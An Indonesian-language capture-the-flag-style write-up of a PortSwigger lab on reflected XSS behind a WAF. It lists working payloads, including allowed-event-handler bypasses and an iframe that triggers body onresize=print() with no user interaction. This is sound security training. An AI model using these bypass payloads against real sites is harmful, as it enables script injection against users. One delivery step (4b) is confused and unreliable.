
# Reflected XSS into HTML context with most tags and attributes blocked
# Reflected XSS dalam Konteks HTML dengan Kebanyakan Tag dan Atribut Diblokir

Lab ini mengandung kerentanan **Reflected Cross-Site Scripting (XSS)** pada fungsi pencarian, namun dilindungi oleh **Web Application Firewall (WAF)** yang mencegah vektor XSS umum.

Untuk menyelesaikan lab ini, Anda perlu melakukan serangan cross-site scripting yang dapat melewati WAF dan memanggil fungsi `print()`.

**Catatan:** Solusi Anda tidak boleh memerlukan interaksi pengguna. Mengaktifkan `print()` secara manual di browser Anda sendiri tidak akan menyelesaikan lab ini.

---------------------------------------------

## Referensi:

- [PortSwigger: Exploiting Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting/exploiting)
- [PortSwigger: XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [MDN Web Docs: XMLHttpRequest.send()](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/send)

![Langkah 1](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/1.png)

---------------------------------------------

## Langkah-Langkah Eksploitasi

### 1. Mengidentifikasi Kerentanan Reflected XSS pada Fungsi Pencarian

Pertama, kita perlu memastikan bahwa terdapat kerentanan XSS pada fungsi pencarian. Payload sederhana berikut dapat digunakan untuk menguji kerentanan tersebut:

```html
</p><img src=x onerror=alert(1) /><p>
<script>alert(1)</script>
```

![Langkah 1](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/1.png)

Payload ini menjalankan fungsi `alert` untuk memastikan bahwa kerentanan XSS benar-benar ada.

### 2. Memahami Pembatasan WAF pada Tag dan Atribut

WAF yang digunakan dalam lab ini memblokir sebagian besar tag dan atribut yang umum digunakan untuk serangan XSS. Namun, beberapa event handler masih diperbolehkan, yaitu:

- `onbeforeinput`
- `onratechange`
- `onscrollend`
- `onresize`

Selain itu, tag kustom seperti `<xss>` dan tag `<body>` juga masih diperbolehkan.

![Langkah 2](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/2.png)

### 3. Menguji Payload yang Diperbolehkan oleh WAF

Beberapa payload yang berhasil dilewati oleh WAF adalah sebagai berikut:

```html
<xss contenteditable onbeforeinput=alert(1)>test</xss>
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><h2>a</h2><h3 id=x>test</h3></xss>
<body onresize="print()">
```

![Langkah 3](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/3.png)

### 4. Membuat Payload untuk Memanggil Fungsi `print()`

Tujuan kita adalah memanggil fungsi `print()` tanpa memerlukan interaksi pengguna. Salah satu cara untuk melakukannya adalah dengan menggunakan tag `<body>` dan event `onresize`. Namun, agar fungsi `print()` dipanggil tanpa interaksi, kita perlu memaksa peristiwa `resize` terjadi secara otomatis.

#### a. Membuat Iframe yang Memuat Payload

Kita akan mengirimkan payload `<body onresize="print()">` dalam sebuah iframe. Kemudian, kita akan memicu event `resize` secara otomatis melalui skrip.

```html
<iframe src="https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload="body.style.width='100%'"></iframe>
```

Payload ini akan membuat iframe yang memuat halaman dengan payload XSS. Ketika iframe dimuat, skrip `onload` akan mengubah lebar `body`, yang akan memicu event `resize` dan memanggil fungsi `print()`.

![Langkah 4](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/4.png)

#### b. Mengirimkan Payload melalui Fungsi Pencarian

Masukkan payload iframe di atas ke dalam fungsi pencarian dan kirimkan. Jika berhasil, setiap kali pengguna melihat hasil pencarian yang memuat komentar tersebut, fungsi `print()` akan dipanggil tanpa interaksi pengguna.

![Langkah 5](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/5.png)

### 5. Memverifikasi Eksekusi Payload

Setelah mengirimkan payload, periksa apakah fungsi `print()` telah dipanggil. Anda dapat melakukannya dengan memeriksa apakah dialog cetak muncul atau dengan melihat log aktivitas di konsol browser.

![Langkah 6](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/6.png)

## Penjelasan

**Reflected Cross-Site Scripting (XSS)** adalah jenis kerentanan di mana skrip berbahaya disuntikkan ke dalam respons HTTP langsung melalui input pengguna. Dalam kasus ini, skrip dijalankan di konteks HTML dengan sebagian besar tag dan atribut yang umum diblokir oleh WAF.

### Mengatasi Pembatasan WAF

WAF sering kali memblokir tag dan atribut yang umum digunakan untuk serangan XSS, seperti `<script>`, `onerror`, dan lain-lain. Namun, masih ada beberapa event handler yang diperbolehkan, seperti `onbeforeinput`, `onratechange`, `onscrollend`, dan `onresize`. Dengan memanfaatkan event handler ini pada tag yang diperbolehkan seperti `<xss>` atau `<body>`, kita dapat menjalankan skrip berbahaya.

### Payload Iframe dengan Event `onresize`

Dengan menggunakan tag `<body>` dan event `onresize`, kita dapat memanggil fungsi `print()` secara otomatis. Namun, untuk memicu event `resize` tanpa interaksi pengguna, kita menyisipkan iframe yang memuat halaman dengan payload XSS dan menggunakan event `onload` pada iframe untuk mengubah gaya `body`, yang akan memicu event `resize`.

```html
<iframe src="URL_LAB/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload="body.style.width='100%'"></iframe>
```

### Pentingnya Validasi dan Sanitasi Input

Kerentanan XSS dapat digunakan untuk menjalankan skrip berbahaya dalam konteks pengguna yang terautentikasi, memungkinkan penyerang untuk melakukan berbagai tindakan tidak sah. Oleh karena itu, sangat penting untuk selalu memvalidasi dan menyaring input pengguna di sisi server untuk mencegah penyuntikan skrip berbahaya.

## Kesimpulan

Eksploitasi **Reflected XSS** dalam konteks HTML dengan pembatasan WAF memerlukan kreativitas dalam memilih tag dan atribut yang masih diperbolehkan. Dengan memanfaatkan event handler yang tersedia dan teknik seperti penggunaan iframe, penyerang dapat menjalankan skrip berbahaya seperti memanggil fungsi `print()` tanpa memerlukan interaksi pengguna. Penting untuk selalu menerapkan praktik keamanan terbaik, seperti sanitasi input dan konfigurasi WAF yang tepat, untuk mencegah kerentanan ini.

## Referensi Tambahan

- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
